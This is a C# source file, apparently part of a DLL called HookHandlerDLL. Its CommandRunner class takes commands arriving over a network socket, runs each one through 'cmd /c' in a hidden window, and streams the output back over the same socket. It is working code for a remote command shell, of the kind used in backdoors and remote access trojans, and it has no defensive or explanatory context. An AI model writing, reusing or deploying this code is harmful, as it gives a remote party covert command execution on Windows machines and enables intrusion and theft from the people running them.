using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HookHandlerDLL
{
    public class CommandRunner
    {
        Socket socket;
        public CommandRunner(Socket socket)
        {
            this.socket = socket;
        }

        public void Run(string command)
        {
            string[] res = WriteSearchResult(RunCMD("/c "+command));
            foreach(string s in res)
            {
                Send(s);
            }
        }

        private StreamReader RunCMD(string command)
        {
            Process proc= proc = new Process();
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", command);

            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            proc.StartInfo = procStartInfo;
            proc.Start();
            return proc.StandardOutput;
        }

        private string[] WriteSearchResult(StreamReader stream)
        {
            List<string> res = new List<string>();
            while (true)
            {
                String s = stream.ReadLine();
                if (s == null) break;
                res.Add(s);
            }
            return res.ToArray();
        }

        private void Send(string message)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(message);
            socket.Send(new byte[] { 2 });
            SendVarData(buffer);
        }

        private void SendVarData(byte[] data)
        {
            int total = 0;
            int size = data.Length;
            int dataleft = size;


            byte[] datasize = new byte[4];
            datasize = BitConverter.GetBytes(size);
            socket.Send(datasize);

            while (total < size)
            {
                int sent = socket.Send(data, total, dataleft, SocketFlags.None);
                total += sent;
                dataleft -= sent;
            }

        }


    }
}
